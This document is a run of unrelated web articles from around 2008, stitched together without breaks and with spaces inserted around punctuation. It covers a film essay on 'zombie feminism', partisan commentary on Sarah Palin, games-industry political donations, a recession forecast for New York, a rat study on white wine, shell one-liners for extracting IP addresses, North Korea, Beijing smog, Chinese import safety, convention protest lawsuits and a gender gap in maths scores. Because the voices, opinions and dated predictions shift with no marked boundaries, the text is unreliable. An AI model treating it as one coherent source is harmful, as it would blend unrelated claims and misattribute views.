If you were to boil the message of this film down to one basic point ( which you probably should n't ) , it would be that men should n't rape women because those women might turn out to be superpowered zombies who want to eat your you - know - what .
As you can see from this tiny piece of the teaser , the movie is an emo arthouse take on your standard " how do you contain a zombie " plot .
Filmmakers Marcel Sarmiento and Gadi Harel did not accidentally create a movie that dabbles in questions of how women are degraded by men .
That 's basically the point of the story :
Our vengeful zombie 's refusal to be raped and ruined is symbolic enough to provide social commentary , but grody enough to keep you entertained .
Still , it was n't that long ago that raped women in movies just stayed dead . << br >
What struck me immediately on seeing the trailer for Deadgirl was that Sarmiento and Harel were clearly referencing another dead , raped girl wrapped in plastic .
Laura Palmer , the girl whose murder rips apart the tiny town of Twin Peaks in the eponymous cult TV series , is also found " dead , wrapped in plastic , " as one character puts it .
You can see her glamor shot above , an image that was used to advertise the haunting David Lynch series starring Kyle McLaughlin as FBI agent Dale Cooper , come to investigate the former prom queen 's murder .
Investigating the horrifying events that led to Laura 's murder takes Cooper into a supernatural world of ghosts and the undead .
But Laura never avenges herself .
Her spirit lingers , as does the evil BOB spirit who has helped perpetrate the crime , but Laura herself never has a chance to fight back zombie - style .
Maybe she 's the pre-feminist zombie , the modest and lady - like creature who lets men solve the mystery of her death for her .
The message of Twin Peaks , at least in terms of its dead girl protagonist , is that men wo n't get away with rape — but they 'll be brought to justice by other men , not the women they 've victimized .
Similarly , the cult 1980s film River 's Edge features a very Deadgirl - esque plot .
A teen rapes and murders his girlfriend , then leaves her body out for all his friends to see .
They decide to cover up the murder , visiting the dead girl 's body every day until a few of them realize what they 've done is wrong and turn in the perpetrator .
That haunting image of the dead girl , unable to fight back , is partly what fuels the bizarre rage at the heart of zombie feminism .
Watching that pretty , dead face , you want her to get up and scream :
You want her to bite that raping bastard 's scalp off and drool his brains all over the place .
And that was precisely the pleasure in watching this year 's other great zombie feminist masterpiece , Zombie Strippers .
This flick features porn star Jenna Jameson as a stripper bitten by a zombie infected by a government drug to keep soldiers fighting after they die .
The more zombie - fied she gets , the more the clientele goes crazy for her .
Even when she drags men into the back room and rips their throats out and bites their dicks off .
Soon , the other strippers are begging to be infected too , so they can make more in tips .
Before long , nearly all the strippers are infected , and they 've got a giant basement room full of all the reanimated , mutilated men they 've been gnawing on .
None of these strippers are being raped or murdered by men — they 're just dealing with standard - issue stuff like objectification and the dangers of working in the sex industry .
And yet it 's hard not to see their undeaths as a kind of revenge on men who treat women like objects .
These guys come to the strip club to " get some meat , " and then they 're turned into meat themselves .
The problem here is that the men actually like it .
Their favorite strippers are the zombies , and the women have gained " power " only by becoming monsters .
Just as our girl in Deadgirl can only fight back because she 's a monster .
So is the message of zombie feminism that a strong women is always a monster ?
That she must die and return as a ghoul in order to fight back against rape and less violent forms of sexism ?
Or is the message that men must die and become zombies themselves before women will ever be happy ?
Two years ago , a brilliant Canadian comedy called Fido posed that very question .
A traditional housewife played by Carrie Ann " Matrix " Moss falls in love with the zombie servant her husband brings home from the zombie control factory ( after people start rising from their graves , his employer invents a " control collar " that makes them docile ) .
Why is the zombie man better than her husband ?
He cooks , he cleans , he takes care of their son and pays attention to her .
An object himself , he 's able to see the humanity in a woman who is treated like an object by all the living men in her life .
Ever since Dr. Frankenstein reanimated a woman to serve as his monster 's bride and she said no , the zombie woman has been a weird figure for female resistance to control .
Zombie feminism is an uneasy subgenre , daring to use freakish gore and death slapstick to pose questions about what it might take for women to become unrapeable .
Or for men to see women the way women see themselves .
The question is , why do we have to imagine ourselves as monsters in order to tell stories about what it would be like to become fully human ?

Valley Congressman Brad Sherman ( D - Sherman Oaks ) stood his ground on Friday during the second House bailout vote that passed .
He , along with the majority , voted no on Monday and he once again voted no on Friday , although that time in the minority .
During a session of congress on the night before Friday 's vote , he said proponents of the bailout were apparently saying martial law be put in place if the vote did n't go through .
" That 's what I call fear mongering , " Sherman said .
Palin talks to Couric -- and if she 's lucky , few are listening James Rainey - LATimes

Only one of the two women showed poise , focus and a good grasp of the facts , and it was n't the one who 's running for vice president ....
I ’m sorry — Sarah Palin is a bad joke Jay Bookman - Atlanta Journal and Constitution Palin is living , breathing proof that John McCain lies when he claims to put this country first over politics .
She makes Dan Quayle look like Albert Einstein with a better haircut .
Shameless and clueless Sarah Palin David Horsey - Seattle Post - Intelligencer
How would Republicans be reacting if Gov. Christine Gregoire were the Democratic candidate for vice president and she claimed that , because Washington borders Canada and sends trade missions to Japan and China and Russia , she is , therefore , experienced in foreign policy ?
And what if Gregoire also claimed to be a seasoned commander - in - chief because she is titular head of the Washington National Guard ?
We all know how Republicans would react : they would roar with mocking laughter .
And they would be absolutely right to mock such idiotic pretense .
and no help from Palin 's side of the aisle either :
Jake Tapper quotes conservative columnist Kathleen Parker : Watching the CBS interview of Alaska Gov. Sarah Palin did not exactly fill Parker with confidence : " Palin 's recent interviews with Charles Gibson , Sean Hannity and now Katie Couric have all revealed an attractive , earnest , confident candidate .
Who Is Clearly Out Of Her League .
and my favorite , from a compilation on the British " firstpost "
Babbling Palin ‘ makes George Bush sound like Cicero’ Rod Dreher a religious - conservative blogger who frequently appears on Fox News and was as recently as last week a Palin supporter , says the Alaskan Governor " was mediocre " .
Dreher says he felt " embarrassed " listening to Palin " regurgitating talking points mechanically , not thinking .
[ She ’s ] just babbling .
She makes George W. Bush sound like Cicero . "
Never mind that just with the recent and ongoing breaking story about McCain aide Rick Davis ' clear and damaging financial ties to Freddie Mac , that McCain has ample reason to deflect attention with his debate dodging - crisis invoking Washington bailout gambit- this Sarah Palin video alone is enough to end this thing .
And this is confirmed for me in the comments posted by readers on the various sites I looked at - please peruse them - they simply reinforce the fact of how bad this is .
So please distribute this videolink by email far and wide - make sure as many Americans see the Palin Couric interview as possible .
I really believe this alone can and will end this thing .
People are almost literally running for their lives from this debacle .

A Question Reprised , but the Words Come None Too Easily for Palin
While it is quite likely , and perhaps understandable , that Ms. Palin felt nervous and spooked by all the media attention , it was n’t a reassuring performance ... it may be hard for Mr. McCain ’s running mate to recoup .
It was n’t her first interview on national television , but in some ways it was the worst .
UPDATED 2 : Wow ! over 500 responses - I 've selected some of my favorites if you do n't feel like wading through all 600 plus :

Up took a broad look at who the gaming industry , on the whole , was giving to in U.S. political campaigns .
Develop Magazine revisited the subject this weekend , going through Federal Election Commission records to find the donation history of games industry heavy hitters and see who 's backing whom in the U.S. presidential smackdown .
Interestingly , Will Wright 's given $ 3,000 to John McCain , after crapping out with a $ 2,350 bet on Rudy Giuliani in the primaries .
On the other side , Take Two Chairman Strauss Zelnick , has gone hard for the Democrats - no surprise there , considering how his games are such pariahs in the culture war demagoguery of the right .
Zelnick 's given $ 2,000 to Barack Obama , and hedged his bets in the primary with $ 2,500 for John Edwards in the primary , and a grand each for Joe Biden and Bill Richardson .
No Hillary ?
Dis !
Yeah , wonder why .
Anyway , there are more names and numbers on the jump .
Giving to Republicans , according to Develop : • Will Wright : ( Spore , The Sims ) $ 3,000 to McCain ; previously donated $ 2,350 to Giuliani • Bobby Kotick ( Activision CEO ) $ 2,300 to McCain ; previously donated $ 2,100 to Mitt Romney • Curt Schilling ( 38 Studios ) $ 2,300 to McCain .
Does Schilling really qualify here ?
Yeah , guess so .
Democratic contributors , according to Develop : • Strauss Zelnick ( Chairman , Take - Two ) $ 2,000 to Obama ; had previously donated to $ 2,500 to Edwards , $ 1,000 each to Biden & Richardson • Ben Feder ( CEO , Take - Two ) contributed $ 1,000 to Biden in 2007 • Sam Houser ( Rockstar ) $ 4,600 to Obama • Patricia Vance ( president , ESRB ) $ 2,000 to Obama • John Riccitiello ( CEO , EA ) $ 4,600 to Obama • John Smedley ( Sony Online Entertainment ) $ 2,300 to Obama • Richard Garriott aka " Lord British " ( Ultima series , NC Soft ) $ 2,300 to Hillary Clinton • Alex Rigopulos ( CEO , Harmonix ) $ 4,600 to Obama , the maximum allowable in two cycles , plus a $ 28,500 contribution to his victory PAC .
• Kathy Vrabeck ( president , EA Casual ) $ 2,300 to Obama • Gabe Newell ( pres. , Valve ) $ 2,300 to Christopher Dodd
By the way , if you want to look up neighbors , bosses , professors , celebrities , whomever and see who they 've supported with the long green , Congressional Quarterly 's Moneyline is much more user - friendly than the FEC .

Pass the Hamburger Helper and the Milwaukee ’s Best .
Broom that interior decorator ; Ikea ’s got some dynamite furnishings .
Boy , those public schools sure look better than I thought — what was so great about Dalton or Nightingale - Bamford or Saint Ann ’s , anyway ?
Those Koreans make fabulous cars .
And phones and TVs and everything else , for that matter .
What will New York look like a year from now ?
The answer : bad and probably worse , and perhaps downright catastrophic .
Three degrees of awful .
The first step was passing the bank - bailout legislation .
Now that it ’s done — and if it did n’t get done we would have been looking at a guaranteed economic collapse — the critical issue will be presidential leadership .
And while any president will be an improvement over the current one , there is a growing belief on Wall Street that Barack Obama has the capacity to lead us out of this wilderness while John McCain does not .
I ’ll go a step further : Obama is a recession .
McCain is a depression .
Wall Street usually favors Republicans when it comes to managing the economy , but this time around the financial community is skeptical .
John McCain has done everything he can to avoid talking about the economy , lest he be tarred with the brush of George Bush ’s ineptitude .
And when McCain has attempted to step into the fray , he ’s been far from reassuring .
First , he insisted that the fundamentals of the economy were sound ; then he turned around and told us it was the end of the economic world as we know it , and suspended his campaign to scramble back to Washington and save the day on the bailout bill — only to have little visible effect .
For all his talk of being a maverick , McCain looks an awful lot like President Bush on the credit crisis :
He does n’t seem to understand Wall Street or Main Street , he is dogmatically anti-regulation , and his economic team is a joke .
Carly Fiorina almost destroyed the onetime best technology company in America , Hewlett - Packard , and Meg Whitman took eBay , the best dot - com player , and turned it into a mediocre franchise that has no growth .
Both are perceived by Wall Street to be also - rans who are on the team because they have nothing else to do .
Obama is no messiah , of course , but there ’s a reason the Street sees him as a more capable manager of the credit crisis .
He seems to understand the complexity of the problem , and while he ’s nobody ’s populist , he ’s at least perceived as less tone - deaf to everyday Americans ’ problems than his opponent .
Obama also has a better team , in the likes of Larry Summers , the renowned economist and former Harvard president who probably knows more about this crisis than anyone , and Warren Buffett , the smartest man in business , period .
And Obama is a globalist , in an age where the world ’s economies are increasingly interdependent .
Some people discount the president ’s role in managing the economy .
They argue that the chief executive gets too much credit when the nation ’s finances are good and too much blame when they ’re bad .
That may be true , but not in this case .
One of the central causes of the current financial crisis is the now - epidemic lack of trust in the banking system .
With the nationalization of Fannie and Freddie and AIG , the shuttering of Lehman , the shotgun marriages of Bear and Washington Mutual , the American people are n’t just shying away from risk , they are shying away from banks altogether , with the middle class leaving for the First National Bank of Sealy and the upper class headed to Duxiana Bank and Trust .
That kind of pessimism , left unchecked , could easily turn a recession into a depression , as that sense of helplessness now pervades everyone who would invest in a new company , grow a small business , or buy a house or car .
Having a president who can restore faith in the system as quickly as possible is critical to thawing the credit freeze .
McCain ’s stumbling and uncertainty are themselves a liability .
Obama not only gives off the sense that he can solve the problem more effectively , but he ’s a better communicator who ’s more capable of inspiring confidence .
Obama more than his opponent can convince us that the only thing we have to fear is economic fear itself .
And with the economy going nowhere but south unless faith in the system is restored , we need convincing .
Let ’s assume for the moment , if only because the most recent polls suggest it will happen , that Obama becomes president .
How will the economy look a year from now ?
Still pretty damn bad .
Before things settle down , we ’re going to see credit defaults spreading from residential homes to commercial real estate to credit cards .
I can see unemployment hitting 10 percent before heading down .
It ’s that tough to get credit right now , and it will take that much time for new money — even if it ’s injected today , and people stop hoarding it — to make its way through the system .
Things will be roughest in the most depressed housing markets , like those in Florida , California , Nevada , Arizona , Ohio , and Indiana , where foreclosures will remain an issue no matter how many bills get passed to buy up mortgages and mortgage - based securities .
At this time next year , I could see the Dow as low as 8,300 .
That ’s more than 40 percent off its October 2007 high of 14,164 .
On Main Street , that means a further slowdown in consumer spending , as buyers feel poorer , and another hit for 401 ( k ) and college savings accounts .
For Wall Street , it means more bank closures and mergers and still more layoffs .
The two remaining independent commercial banks–née –investment banks , Goldman Sachs and Morgan Stanley , will have to fight mightily to remain independent .
The bet here is that Goldman makes it but Morgan Stanley succumbs to one of the four emerging megabanks —
Citigroup , JPMorgan , Bank of America , and Wells Fargo .
Even those banks that survive will be letting people go — that ’s the only way the economics of these deals work .
Those people who left investment banks for hedge funds will now find the doors closed should they seek to return ( and with the hedgies getting clobbered , too , they will seek to return ) .
Bonuses will be slashed industry - wide , as banks seek to hang on to capital .
And even the megabanks , the big winners in the subprime shakeout , will rein in salaries .
Why not ?
If someone does n’t like it , there are more than 100,000 out - of work bankers ready to take their place .
In terms of investing between now and next fall , I ’d buy the stocks of only companies you ca n’t not use — Kellogg ’s , General Mills , Kraft , P&G .
You ca n’t trust anything to do with financial paper — there ’s still too much uncertainty ( if a bailout bill does pass , at what price will the toxic bonds be marked ? ) .
And commodities have been bid up too high — demand soared as investors sought shelter from stocks — to buy for some time .
Oil ’s going to $ 50 on weaker demand ; when it gets there , we can revisit the oil stocks .
Main Street will look different too .
After years of overexpansion , retail ’s going to be in massive retreat , except Wal - Mart , Costco , outlet malls , and a couple of Lowe’s .
Amazon will become your de facto store , as it will be providing pretty much everything .
By this time next year , Amazon could be rolling out national same - day service , which would be a real bricks - and - mortar killer , the last nail in the retailers ’ coffin , not unlike what Google ’s done to the media .
Without job growth , we will have anemic auto sales , and by this time next year the big automakers will have burned through the subsidies they just received and either come back for more or , yes , declare bankruptcy , something that ’s definitely on the table with this ailing group .
And even though gasoline will come down , a sense of feeling poorer will still crimp travel and entertainment .
At this time next year , I could see the Dow as low as 8,300 .
That ’s more than 40 percent off its October 2007 high of 14,164 .
Here in New York , so many professionals made so much money when things were booming that I believe our economy will be cushioned somewhat , even as Wall Street ’s taking it on the chin .
That ’s why you still see people shopping , despite the headlines .
The weak dollar and the foreign investment it attracts will help , too , although that economic engine will also slow somewhat as the world economy cools .
If you worked at Bear Stearns or Lehman Brothers or AIG or Washington Mutual , you are no doubt already singing the praises of in - home eating , and most of us will have to accept a lower standard of living .
Those of us lucky enough to have socked away savings from the seven fat years before this will work our way through the lean times ; we may bargain - hunt at Century 21 , but we wo n’t hang ourselves with the ties we purchase there .
Many of those without a nest egg will find themselves in foreclosure , personal bankruptcy , or other dire financial straits .
Tax hikes , cuts in government services , soaring budget deficits , or all of the above are in the offing , too .
Not even Mike Bloomberg , should his third - term wish come true , can spare us from some significant pain .
Although I do n’t see a return to the pre-Rudy days , it ’s hard to imagine how upticks in the welfare rolls and crime rates are n’t on the horizon .
According to the most recent real - estate statistics , released last week , the average price of a Manhattan apartment rose some 10 percent in the third quarter over last year , to about $ 1.4 million .
But for the first time in years , the number of apartments sold dropped sharply .
That ’s an ominous sign .
If all that seems depressing , take heart .
The same sector that got us into this mess — housing — will lead us out of it .
The federal government , sub rosa , has determined that we will have a European - style financial system , consisting mainly of the four megabanks I mentioned — Citigroup , JPMorgan , Bank of America , and Wells Fargo .
These are the institutions that will be deemed too big to fail and will be protected no matter what .
In return for the creation of the jolly oligopoly , these four banks will have to make mortgage money available to all at a reasonable price , something that will help real estate bottom and begin heading upward before this time next year .
Of course , it helps that Fannie Mae and Freddie Mac are nationalized and can absorb hundreds of billions in losses to make it so .
It will also help that I expect short - term interest rates to decline to 1 percent as the Federal Reserve wakes up to the notion that the battle was , is , and will be deflation , not inflation , so rates have to be as low as possible to stir economic activity and drive unemployment down .
Once that happens , and housing rebounds , the rest of the economy will follow .

White wine lovers can feel a little less guilty about their habit .
New research suggests that white varieties may offer similar heart benefits to red wines .
Rats that were fed white wine as part of their diet suffered less heart damage during cardiac arrest , compared to animals fed only water or grain alcohol .
These benefits were similar to animals that ingested a red wine or its wonder ingredient found only in grape skin , resveratrol .
White wine , made from the pulp of the grape but not the skin , contains no resveratrol , which led many to pin the so - called “ French paradox ” – high fat intake but low rates of heart disease – on moderate consumption of red wines .
Not just reds , says Dipak Das , a molecular biologist at the University of Connecticut School of Medicine in Farmington .
“ The flesh of the grape can do the same job as the skin . ”

Chemical protection
He and colleagues gave lab rats measured doses – roughly equivalent to one or two glasses a day – of red or white Italian wines , while others received comparable doses of different chemical ingredients thought to underlie the health benefits of wine , called polyphenols .
In lab rats that suffered heart attacks , the animals that received wine or polyphenols experienced less heart damage , compared to rats fed water or straight liquor .
Their blood pressure and aortic blood flow plummeted less drastically as well .
Molecular tests of heart cells suggest that white wine protects the cell ’s powerhouses – mitochondria .
Damage to these structures caused by lack of oxygen and nutrients can send cells down one - way path to suicide , or apoptosis .
The mitochondria from wine - drinking rats looked to be in better shape and fewer of their cardiac cells entered apoptosis .
This was also the case for rats that got polyphenols , including resveratrol from red wine , and tyrosol and hydroxytyrosol from whites .
A look at the structure of the three chemicals ’ offers one possible reason why , Das says .
While not identical , the trio have enough similarities that they could activate some of the same cellular reactions .
English paradox ?
Das ’s data provide compelling evidence that white wine protects laboratory rats from the effects of a heart attack , says Lionel Opie , director of Hatter Institute for Cardiology Research in Cape Town , South Africa .
However , he points out that human heart attacks occur due to blood clots in diseased arteries and not necessarily because of mitochondrial failure .
More relevant experiments in dogs showed a benefit for red wine , but not white , Opie adds .
But Das expects similar studies to soon prove white wine ’s worth .
“ We can safely say that one to two glasses of white wine per day works exactly like red wine , ” he says .
Das blames white wine ’s late inclusion to the French paradox on the phenomenon ’s original medical report in 1992 , as well as researcher ’s single - minded focus on resveratrol .
And while the evidence is still scant , an “ English paradox ” may yet emerge .
“ Beer is also cardioprotective , ” Das says .

A friend of mine recently showed me his version of extracting ip address ( es ) from ifconfig .
The ifconfig tool on Linux is used to list IP addresses and configure network interfaces .
It is sometimes necessary to capture your IP in a variable , like when writing some firewall rules .
I decided to show off and golf the extraction of IP address with four commonly used tools --
Awk , sed , a version of Perl everyone has , and the latest version of Perl 5.10 .
His original version was pretty ugly :
$ ifconfig | perl - ple ' print $ _ if / inet addr / and $ _ =~ s/.* inet addr :((?:\d+\. ) {3}\d+ ) .*/$ 1/g ; $_= " " ' | grep - v ^\s * $
My own version on my firewall was :
$ ifconfig | grep inet | awk - F : '{ print $ 2 } ' | awk '{ print $ 1 }'
This looks nicer but I was uselessly using grep , and calling awk twice .
Golfing in Perl
My first attempt was to do it with grep and Perl .
$ ifconfig | grep inet | perl - ple '( $_ ) = / addr : ( [ ^ ] + ) /'
192.168.1.1 127.0.0.1
In a split second I realized that Perl does grep itself :
$ ifconfig | perl - nle ' / addr : ( [ ^ ]+ ) / and print $ 1 ' 192.168.1.1 127.0.0.1
Then I noticed that ' dr : ' matches the same lines as ' addr : ' ; also ' and ' can be replaced with ' && ' :
$ ifconfig | perl - nle '/ dr : ( [ ^ ]+ ) / && print $ 1 ' 192.168.1.1 127.0.0.1
The regular expression '( [^ ]+ ) ' can be replaced with ' ( \S+ ) ' , which matches non-whitespace characters :
$ ifconfig | perl - nle '/ dr :( \S+ ) / && print $ 1 ' 192.168.1.1 127.0.0.1
Cutting the whitespace , the final version for Perl is 37 characters long :
$ ifconfig|perl - nle '/dr :( \S+ ) /&&print$ 1 '
192.168.1.1 127.0.0.1
Golfing in Perl 5.10
It can be made shorter with Perl 5.10 , which introduces the new say function :
$ ifconfig|perl - nE'/dr :( \S+ ) /&&say$ 1 ' 192.168.1.1 127.0.0.1
The result for Perl 5.10 is 34 characters .
Golfing in sed
Then I also tried doing the same with sed :
$ ifconfig | sed -n '/dr:/{;s/.*dr://;s/
.*//;p;} '
192.168.1.1 127.0.0.1
I modified it to strip off everything that was not numbers and dots :
$ ifconfig | sed -n '/dr:/{;s/.*dr:\( [ 0 - 9 . ] \+\ )
.*/\1/;p;}'
192.168.1.1 127.0.0.1
This turned out to be much longer , so I tried getting rid of backslashes , by enabling extended regexes in sed with -r argument :
$ ifconfig | sed - rn '/dr:/{;s/.*dr:( [ 0 - 9 . ] + )
.*/\1/;p;}'
192.168.1.1 127.0.0.1
I forgot that I had used the ( [ ^ ]+ ) regex before .
Another my friend reminded me this , shortening the sed script to :
$ ifconfig | sed - rn 's /.*r :([ ^ ] + ) .*/\1/p' 192.168.1.1 127.0.0.1
Dropping the whitespace , sed version turned out to be 40 characters long .
Golfing in Awk
My final attempt was to optimize my original Awk version :
$ ifconfig | awk '/dr:/{gsub(/.*:/ , " " , $ 2 ) ; print $ 2} ' 192.168.1.1 127.0.0.1
Cutting the whitespace , the Awk version is 43 characters .
The Winner
The winner in this golf tournament is Perl 5.10 with 34 chars !
Can You Do Better ?
Can you golf this even shorter ?
PS . my awk and sed cheat sheets might come handy !

“ North Korea has cut the seals and shuttered the cameras .
Next up , North Korea tosses the inspectors , ” I wrote yesterday in my blog post , Provisionally Delisting North Korea .
This morning , North Korea tossed the inspectors .
Elaine Scolino reports this morning in the New York Times .
North Korea has barred international inspectors from its nuclear reprocessing plant and intends to begin introducing nuclear material to the plant in a week , the International Atomic Energy Agency said on Wednesday .
This all heading toward North Korea reprocessing the spent fuel from the Yongbyon and , eventually , conducting another nuclear test .
It is also totally preventable if The Decider would just suck it up and delist North Korea — provisionally , of course .
Seriously , just reread yesterday ’s post , or the modified version of which is cross-posted over at Danger Room .
Image note : The Times chose the same photo of Sig Hecker at Yongbyon that I did in April .
Strangely , they credit it to AP — but I believe Keith Luse took the picture .
The images are online .
The image I chose for this post , though lacking Dr. Hecker , is more relevant — it actually shows a corner of the reprocessing facility with some equipment that I probably ought to recognize , but do n’t .
Last week , we reported on how China 's herculean efforts to clean up Beijing 's air ahead of the Olympics would n't work if the weather did n't cooperate .
Starting last Sunday , the air - cleaning regimen went into effect .
Some trucks were banned from the road , traffic curbs were instituted , regional factories were shut down and in - city construction work stopped .
But yesterday , at least , the weather did n't cooperate .
Take a look at this picture snapped by our friends at the Chinese research firm , Pacific Sun Investment Management , at 3 o'clock Beijing time yesterday from the 20th floor of a building in the Central Business District .
Surely , air like this would send off air - quality alarm bells , right ?
Well , any day with enough particulate matter in the air to register over 100 on China 's pollution index is considered bad .
Over the last decade , Beijing has been measured to regularly reach 200 , and sometimes even 500 .
The day this picture was taken rated a mere 113 , or " slightly polluted , " on the possibly rigged official rating .
Yikes : what would a 300 look like ?

Call me paranoid but I am careful about what I allow in my house .
When I buy toys for my son I actually look to see where they are made .
The same with clothing .
And ditto for food items .
Although I consider these actions quite sound , there is a kink when it comes to execution .
You see , I try to buy safe items .
The lead paint toy scare made me steer clear of toys from China .
This was something I tried to do anyhow preferring USA manufactured items .
The same for clothing items considering the ridiculously low wages I knew that many companies paid their workers .
As for food , well , I try to buy produce that is grown close - by so that it ’s more nutrient rich .
Of course I think that my success rate in all of these endeavors is somewhere in the single digits ; it feels as if every item on the store shelf is imported .
Heck , trying to find a toy not made in China is like trying to find the leprechaun at the end of the rainbow .
When the lead paint issue became , well , an issue , it was a clear signal that some piece of our regulation process was n’t working .
When it comes to safety , regardless of who blows the whistle , China or America , the whistle needs to be blown before people are harmed .
Recently China has been involved in another safety faux pas .
In the BMJ article , China ’s tainted infant formula sickens nearly 13,000 babies , the details are spelled out .
104 children are seriously ill and four children have died because melamine was in the formula .
A WHO adviser for food safety recently stated :
… for infant formula , given the heavy reliance on this as a food by small infants , it would be particularly prudent for competent authorities to closely monitor the product for contamination …
You think ?
Am I ridiculous to worry about the safety of Chinese imports considering these two recent instances of negligence ?
Especially considering the fact that both of these cases involved items that are used by children .
If so , call me ridiculous .
I know that tainted food and dangerous products can originate from anywhere .
And I realize that the tainted formula does n’t affect consumers in the U.S.
But considering the fact that we import so much from China and other countries ; considering the fact that twice in the last year items made in China were found to be so unsafe ; I think my hesitance is founded .
So yes , I am careful about what I let into my house .
Government systems and regulation departments do not ensure the safety of imported , or domestic for that matter , products .

People planning protests during the Republican National Convention are suing in state court in an attempt to overturn restrictions on where they can assemble .
Two newly filed lawsuits in Ramsey County District Court claim that St. Paul city and police officials are restricting free speech rights by confining demonstrators to a designated assembly area .
The lawsuits cover the same ground , with one calling the public viewing area near the Xcel Energy Center “ inadequate and unacceptably small . ”
Among the people behind the lawsuits is Coleen Rowley , an unsuccessful Democratic candidate for Congress in 2006 who gained attention as an FBI agent - turned - whistleblower after the 9/11 attacks .
Also involved are members of a group called Impeach for Peace , the Twin Cities Peace Campaign and the Welfare Rights Committee .
Previous legal challenges to GOP convention - related restrictions have been turned back in federal court .
“ These two represent an attempt by the plaintiffs to get another bite at the apple in state court , ” said John Choi , the St. Paul city attorney .
He said the city has afforded “ unprecedented access and accommodations for the protesters . ”
The restrictions were carefully crafted to balance public safety and free speech , he said .
City leaders announced last month that they would mark off at least 180,000 square feet of space diagonally across from the arena , where the Sept. 1 - 4 convention will be held .
They ’re providing a stage and microphone .
Applications for stage time , which will be awarded through a lottery , were due Monday .
Bruce Nestor , a lawyer representing some of the protesters , said his clients object to the arrangement because “ the city gets to manage free speech in the name of facilitating free speech . ”
“ Frankly , they can talk about why they like furry animals , ” Nestor said .
“ One person gets as much time as 1,000 people . ”
Plaintiffs in the cases want a temporary injunction forcing the city to disclose more details about the security perimeter around the arena and they want to loosen other restrictions .
No court date has been set .
Original Article
In a January 2005 speech , Harvard President Lawrence Summers provoked the proverbial firestorm by suggesting that women lacked the ‘ intrinsic aptitude ’ of women for math , science and engineering ( story in the Boston Globe on the incident ) .
Summers was merely stating out loud what many people believe : that inherent differences between men and women cause significant inequalities in aptitude for math ( and presumably also for art history , Coptic studies , or cultural anthropology , but they usually get a lot less attention … ) .
A recent report in Science by Janet S. Hyde and colleagues , ‘ Gender Similarities Characterize Math Performance , ’ used a mass of standardized testing data generated under the No Child Left Behind program to compare male and female performance and found that the scores were more similar than different .
The gap in average performance on math tests has shrunk significantly since the 1970s , disappearing in most states and grades for which the research team could get good data .
According to Marcia C. Linn of the University of California , Berkeley , one of the co-authors of the study : ‘ Now that enrollment in advanced math courses is equalized , we do n’t see gender differences in test performance .
But people are surprised by these findings , which suggests to me that the stereotypes are still there . ’
From the way that this report has been discussed , it seems clear that the data has not settled this question in many people ’s minds .
Tamar Lewin of The New York Time covered the story in ( ‘ Math Scores Show No Gap for Girls , Study Finds ‘ ) provoking comments on a wide range of websites , including some who insisted that the team led by Hyde missed entirely the point being made by Summers or that Lewin had misread the study ( some accusing her of feminist bias ) .
In contrast , Keith J. Winstein of The Wall Street Journal focused not on the average scores , but on the results at the top end of the bell curve , writing , Boys ’ Math Scores Hit Highs and Lows , which highlights the discussion of variance in boys ’ scores .
Although I briefly want to go over the study and the way its being interpreted , I ’m more interested in the shift in test scores over time because I think that the movements in these numbers , including gaps that disappear over time ( or do n’t ) , point to a basic problem in the tests themselves .
Well , not a problem in the tests — they ’re very sophisticated instruments for assessing certain kinds of performance on selected tasks — but rather with the common assumption about what these tests actually reveal and the nature of ‘ math ability . ’
For me , this larger point is more important for neuroanthropology because it applies to far more than just the ‘ math gap . ’
The gap in test scores : sample bias ?
The gap between boys and girls in standardized math tests in the 1970s and 1980s seemed to open wider as children grew older .
From a statistical dead heat early in grade school , a pronounced inequality developed by high school that only grew worse at successive stages , up to a near total male dominance of PhDs , math contests , and high status faculty positions in fields like engineering , physics , and mathematics .
A number of people point to the results of things like mathematics olympiads or major prizes for theoretical physics to show that , at the upper end of ability , male dominance is complete .
Although some explained the ‘ math gap ’ as the result of brain differences ( such as differences in spatial sense or abstract reasoning ) in boys or girls that affected math ability , others insisted that the inequality was caused by social forces , stereotypes , or other factors .
One explanation was that the ‘ math gap ’ was a self - fulfilling prejudice ; the assumption that boys would do better both encouraged boys ’ performance and discouraged girls from developing ability in mathematics .
Another argument was that girls were discouraged from publicly demonstrating academic gifts in general as they brought stigma ( as a geeky young man , I find it hard to believe that my female peers were more severely stereotyped , but that ’s a different story ) .
Some critics pointed to the way that changing patterns of enrollment in advanced math classes steadily seemed to be eating away at the ‘ math gap ’ ; they felt that if girls pursued the same educational opportunities , they would have similar results .
But another explanation for the ‘ math gap ’ in performance was a sample bias problem that Hyde and colleagues sought to address in this study .
The research team pointed out that only college - bound students took the SAT ( and ACT ) traditionally , and more girls than boys took the test ( 100,000 or so more every year for the SAT ) .
The lower average for girls ’ test scores might have arisen from the fact that the larger number of girls taking the tests meant that their scores reflected a deeper dip into the talent pool , with a larger percentage of female students being scored .
The additional students — perhaps not the most intellectually gifted girls — were pulling down the girls ’ average score .
Changing policies for administering standardized tests , especially making them mandatory , might provide a better sample , less prone the bias of one group participating at a higher frequency .
For example , in 2002 , Colorado and Illinois mandated that every graduating high school senior take the ACT ; the gender gap between boys and girls disappeared when girls were no longer over - represented in the test .
In fact , girls demonstrated a slightly higher average math score than boys .
As the research team writes : ‘ These findings support the conclusion that the male advantage on the SAT mathematics test is largely an artifact of sampling . ’
In other words , boys scored better because fewer took the test .
Research results from the Hyde team on US scores
The No Child Left Behind program forced states to administer standardized tests broadly .
The team led by Hyde , drawn from faculty at the University of Wisconsin and the University of California , Berkeley , contacted all 50 states to try to get access to these scores , but only 10 gave them enough information to make their samples useful .
Based on test scores for 7 million students , the research team found no difference in the average math scores ; this seemed to be the culmination of a trend of girls steadily gaining ground in math scores , first among younger age groups and recently through adolescence .
The following chart shows the gaps at different grade levels for the ten states :
This chart originally appeared in Science magazine with the article .
From the UC Berkeley News website , we have the following explanation :
Each square represents a grade level in one of 10 U.S. states .
At the center of the chart ( the 0 mark ) , the two genders performed equally in math , with increasing differences between boys and girls toward the left ( where girls outperformed boys ) and right ( where boys outperformed girls ) .
When researchers averaged the results , they found no difference between the two genders in their math proficiency .
The 10 states were New Mexico ( olive ) , Kentucky ( fuchsia ) , Wyoming ( tan ) , Minnesota ( blue ) , Missouri ( red ) , West Virginia ( lavender ) , Connecticut ( green ) , California ( yellow ) , Indiana ( aqua ) , and New Jersey ( purple ) .
Hyde ’s earlier work ( e.g. , Hyde 2005 ) also tested the ‘ innate sex differences in math ability hypothesis , ’ but the meta - analysis of extant studies is just never going to get the traction that 7 million test scores will .
The current study seems to show convincingly that there is no inherent difference between boys and girls on average in mathematics proficiency .
